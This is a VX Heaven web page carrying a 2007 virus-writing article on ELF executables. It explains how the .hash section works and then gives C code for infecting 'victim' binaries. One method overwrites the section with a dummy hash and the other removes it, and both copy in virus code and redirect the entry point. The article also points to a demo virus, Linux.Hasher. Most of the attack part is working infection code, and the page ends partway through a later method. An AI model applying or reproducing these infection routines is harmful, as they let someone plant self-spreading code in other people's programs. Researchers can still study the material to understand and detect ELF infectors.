@@ -1,0 +1,531 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> herm1t 'Hashin' the elves' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="herm1t"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, herm1t,Hashin' the elves, phdr, shdr, hash, segment, liblist, buckets, nchains, dynsz, chains, table, dynsym, code, null, nbuckets, size"/>
+<meta name="Description" content="One day I was looking through the ELF files with objdump and called my attention to .hash section, and thought: gee, can't we take some advantage of it? Nice section after all. Located in the code segment. Could it be shrinked or removed? In this article I want to share my findings."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"ce2e6331c609a82dbce0cc374c4f3e1f0fb8f1ac-1498755130-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vhe02.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Hashin' the elves</h1><p><a href="/lib/?lang=en&amp;author=herm1t"> herm1t</a><br/> <em><a href="/vx.php?fid=1581#f1581">Electrical Ordered Freedom #2 (EOF-DR-RRLF)</a></em><br/> <em>October 2007</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vhe02.html';</script><div class="ci"><a href="/lib/?ci=vhe02">2</a></div>[<a style="" href="/lib/?lang=EN&amp;index=UN#vhe02">Back to index</a>] [<a href="/lib/vhe02.html#disqus_thread">Comments</a>]<br/> 
+<p><strong>Contents</strong></p>
+<ul>
+<li><a href="#c0">Introduction</a>
+<ul>
+<li><a href="#c01">What .hash is needed for?</a></li>
+<li><a href="#c02">How to use the examples from this article?</a></li>
+</ul></li>
+<li><a href="#c1">A. Making "dummy" hash</a></li>
+<li><a href="#c2">B. Removing .hash</a></li>
+<li><a href="#c3">C. Decreasing hash table size</a></li>
+<li><a href="#c4">D. Shrink hash and add the new segment</a></li>
+<li><a href="#c5">References</a></li>
+</ul>
+<h2><a name="c0"></a>Introduction</h2>
+<p>One day I was looking through the ELF files with objdump and called my attention to .hash section, and thought: gee, can't we take some advantage of it? Nice section after all. Located in the code segment. Could it be shrinked or removed? In this article I want to share my findings.</p>
+<h3><a name="c01"></a>What .hash is needed for?</h3>
+<p>Hash table is used to accelerate the access to the symbol table (.dynsym). Arranged in the following way (every element is Elf32_Word):</p>
+<pre class="source">
+    [ nbuckets              ]
+    [ nchains               ]
+    [ buckets[0]            ]
+    .........................
+    [ buckets[nbuckets-1]   ]
+    [ chains[0]             ]
+    .........................
+    [ chains[nchains - 1]   ]
+</pre>
+<p>nbuckets - arbitrary number (greater than zero and lesser than nchains, preferably a prime - for more regular distribution of values in the table), nchains is equal to the number of symbols).</p>
+<p>glibc uses the following function to lookup the symbols by name (elf/do-lookup.h):</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>symidx <span style="color: #339933;">=</span> map<span style="color: #339933;">-&gt;</span>l_buckets<span style="color: black;">&#91;</span>hash <span style="color: #339933;">%</span> map<span style="color: #339933;">-&gt;</span>l_nbuckets<span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;symidx <span style="color: #339933;">!=</span> STN_UNDEF<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;symidx <span style="color: #339933;">=</span> map<span style="color: #339933;">-&gt;</span>l_chain<span style="color: black;">&#91;</span>symidx<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sym <span style="color: #339933;">=</span> <span style="color: #339933;">&amp;</span>symtab<span style="color: black;">&#91;</span>symidx<span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ...<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>sym <span style="color: #339933;">!=</span> ref <span style="color: #339933;">&amp;&amp;</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcmp.html"><span style="color: #000066;">strcmp</span></a> <span style="color: black;">&#40;</span>strtab <span style="color: #339933;">+</span> sym<span style="color: #339933;">-&gt;</span>st_name<span style="color: #339933;">,</span> undef_name<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Not the symbol we are looking for. &nbsp;*/</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ...<br/>
+&nbsp;</div>
+<p>Which is to say:</p>
+<ul>
+<li>Calculate the hash of name (the elf_hash function introduced in ELF format specification)</li>
+<li>Take the value from the buckets[hash % nbuckets] as the index of symbol (symtab located in .dynsym)</li>
+<li>Compare the symbol's name, may it be a collision? (strtab located in .dynstr)</li>
+<li>In the case of false match, look through the chains array</li>
+<li>If the index is equal to zero (STN_UNDEF) - we're screwed now, symbol not found</li>
+</ul>
+<p>I will try to illustrate this with an example of searching the <code>strlen</code> symbol in /bin/ps from my system:</p>
+<pre class="source">
+(*) elf_hash("strlen") = 45
+.hash                            .dynsym                 .dynstr
+offset              +----+
+0   nbuckets        | 67 |
+4   nchains         | 74 |
+                    +----+
+8   buckets       0 |  0 |
+:                   :    :
+:                   :    :
+188     (*)----> 45 | 60 | ----> dynsym[60].st_name ---> "isatty" (no match)
+192              46 |  0 |     /
+196              47 |  0 |    /
+:                   :    :   /
+272              66 | 32 |  /  
+                    +----+ /
+                __________/  
+               /
+              /     +----+
+276 chains   /    0 |  0 |
+:           /       :    :
+464        |     47 | 31 |-----> dynsym[31].st_name ---> "strlen" (found!)
+:          |     ^  :    :
+:          |     |
+:          |      \_____________
+:          |                     \
+:          |        :    :        \
+516        +-->  60 | 47 | ----> dynsym[47].st_name ---> "strdup" (no match)
+520              61 | 0  |
+:                   :    :
+568              73 | 0  |
+:                   +----+
+
+</pre>
+<p>If you still can't pick it up, check the description of ELF format [1].</p>
+<h3><a name="c02"></a>How to use the examples from this article?</h3>
+<p>We first assume that the victim file was already found, checked for validity, opened for read/write (handle - h, length - l), mapped into memory (mapping - m, ELF header - ehdr). All examples are in C. I also wrote four versions (chapter and version numeration are identical) of demo virus (Linux.Hasher) for those who prefer assembly or just want to look the propposed methods of infection in action.</p>
+<p>Defined macros:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define FOR_EACH_PHDR &nbsp; for (i = 0, phdr = (Elf32_Phdr*)(m + ehdr-&gt;e_phoff); i &lt; ehdr-&gt;e_phnum; i++, phdr++)</span><br/>
+<span style="color: #339933;">#define FOR_EACH_SHDR &nbsp; for (i = 0, shdr = (Elf32_Shdr*)(m + ehdr-&gt;e_shoff); i &lt; ehdr-&gt;e_shnum; i++, shdr++)</span><br/>
+<span style="color: #339933;">#define MAKE_HOLE(off,size) do { &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ftruncate(h,l+size); &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; m = mremap(m,l,l + size, 0); &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (m == MAP_FAILED) { &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror(&quot;MAP FAILED!&quot;); &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; goto fini_close; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; } &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (off &lt; l) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memmove(m+off+size, m+off, l-off); &nbsp; &nbsp; &nbsp;\<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; l += size; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\<br/>
+} while(0)</span><br/>
+<span style="color: #339933;">#define SHIFT_SHDRS(offset,delta) do { &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (ehdr-&gt;e_shoff &gt;= offset) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ehdr-&gt;e_shoff += delta; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; FOR_EACH_SHDR &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (shdr-&gt;sh_offset &gt;= offset) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; shdr-&gt;sh_offset += delta; &nbsp; &nbsp; &nbsp; \<br/>
+} while(0)</span><br/>
+&nbsp;</div>
+<h2><a name="c1"></a>A. Making "dummy" hash</h2>
+<p>At first, I just tried to remove the corresponding section, but due to dumb mistake it was no-go (more about that in the next chapter). And I thought, suppose we constructed a hash of minimal size such that do_lookup will always fail? Will the file mutilated in such a way work? It will. Let set nbuckets to 1 (x % 1 = 0) and buckets[0] to 0 (STN_UNDEF). That's all, hash doesn't work, no more hits. The rest of space in the section (section size - 12 bytes) is free.</p>
+<p><strong>NB!</strong> Setting nbuckets to zero will lead to Floating point exception in do_lookup_x (/lib/ld-linux.so), it is small wonder in that, isn't it?</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> <span style="color: #339933;">*</span>hash<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* find hash section */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; FOR_EACH_SHDR<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>shdr<span style="color: #339933;">-&gt;</span>sh_type <span style="color: #339933;">==</span> SHT_HASH<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sh <span style="color: #339933;">=</span> shdr<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/assert.html"><span style="color: #000066;">assert</span></a><span style="color: black;">&#40;</span>sh <span style="color: #339933;">!=</span> NULL<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* do we have enough space? */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/assert.html"><span style="color: #000066;">assert</span></a><span style="color: black;">&#40;</span>code_len <span style="color: #339933;">&lt;</span> sh<span style="color: #339933;">-&gt;</span>sh_size <span style="color: #339933;">-</span> <span style="color: #0000dd;">12</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; hash <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> sh<span style="color: #339933;">-&gt;</span>sh_offset<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memset.html"><span style="color: #000066;">memset</span></a><span style="color: black;">&#40;</span>hash<span style="color: #339933;">,</span> <span style="color: #208080;">0x00</span><span style="color: #339933;">,</span> sh<span style="color: #339933;">-&gt;</span>sh_size<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* nbuckets = 1, so buckets[hash % 1] = buckets[0] = STN_UNDEF */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; hash<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>hash<span style="color: black;">&#91;</span><span style="color: #0000dd;">3</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> code<span style="color: #339933;">,</span> code_len<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ehdr<span style="color: #339933;">-&gt;</span>e_entry <span style="color: #339933;">=</span> sh<span style="color: #339933;">-&gt;</span>sh_addr <span style="color: #339933;">+</span> <span style="color: #0000dd;">12</span><span style="color: #339933;">;</span><br/>
+&nbsp;</div>
+<h2><a name="c2"></a>B. Removing .hash</h2>
+<p>When I tried to remove hash, I tried to rename the section and clog up the pointer of type DT_HASH in .dynamic, indeed the type of section should be changed in the Section Header Tbale (SHT) from SHT_HASH to SHT_PROGBITS (why not, it approaches reality), or to SHT_NULL (<tt>objdump</tt> will not show it). Clean .dynamic also (this step is optional):</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dynsz<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Dyn &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span>dyn<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* save pointer to the .hash entry in the SHT and get dynamic */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; FOR_EACH_SHDR <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>shdr<span style="color: #339933;">-&gt;</span>sh_type <span style="color: #339933;">==</span> SHT_HASH<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sh <span style="color: #339933;">=</span> shdr<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* optional */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>shdr<span style="color: #339933;">-&gt;</span>sh_type <span style="color: #339933;">==</span> SHT_DYNAMIC<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dynsz &nbsp; <span style="color: #339933;">=</span> shdr<span style="color: #339933;">-&gt;</span>sh_size <span style="color: #339933;">/</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Dyn<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dyn &nbsp; &nbsp; <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>Elf32_Dyn<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> shdr<span style="color: #339933;">-&gt;</span>sh_offset<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/assert.html"><span style="color: #000066;">assert</span></a><span style="color: black;">&#40;</span>sh <span style="color: #339933;">!=</span> NULL<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* do we have enough space? */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/assert.html"><span style="color: #000066;">assert</span></a><span style="color: black;">&#40;</span>code_len <span style="color: #339933;">&lt;</span> sh<span style="color: #339933;">-&gt;</span>sh_size<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* remove DT_HASH from dynamic section (optional) */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> dynsz<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>dyn<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">d_tag</span> <span style="color: #339933;">==</span> DT_HASH<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memmove.html"><span style="color: #000066;">memmove</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>dyn<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>dyn<span style="color: black;">&#91;</span>i<span style="color: #339933;">+</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: black;">&#40;</span>dynsz <span style="color: #339933;">-</span> i <span style="color: #339933;">-</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Dyn<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* copy our code */</span> &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> sh<span style="color: #339933;">-&gt;</span>sh_offset<span style="color: #339933;">,</span> code<span style="color: #339933;">,</span> code_len<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* change .hash' type */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; sh<span style="color: #339933;">-&gt;</span>sh_type <span style="color: #339933;">=</span> SHT_PROGBITS<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* change entry point */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ehdr<span style="color: #339933;">-&gt;</span>e_entry <span style="color: #339933;">=</span> sh<span style="color: #339933;">-&gt;</span>sh_addr<span style="color: #339933;">;</span><br/>
+&nbsp;</div>
+<p>Linux.Hasher.b doesn't clean the dynamic</p>
+<h2><a name="c3"></a>C. Decreasing hash table size</h2>
+<p>It isn't neccessary to remove hash completely, let's try to reduce its size, such that both new hash and our virus will fit in the section. This method isn't a very practical, because there are not too many files with large hash in the system, but the method of building the hash would come pat latter. Without hesitation, I got the code from TCC [2]. Here is slightly edited version:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> elf_hash<span style="color: black;">&#40;</span><span style="color: #993333;">const</span> <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>name<span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> h <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> g<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span><span style="color: #339933;">*</span>name<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; h <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>h <span style="color: #339933;">&lt;&lt;</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #339933;">*</span>name<span style="color: #339933;">++;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>g <span style="color: #339933;">=</span> h <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0xf0000000</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; h <span style="color: #339933;">^=</span> g <span style="color: #339933;">&gt;&gt;</span> <span style="color: #0000dd;">24</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; h <span style="color: #339933;">&amp;=</span> ~g<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; <span style="color: black;">&#125;</span> <span style="color: #b1b100;">return</span> h<span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
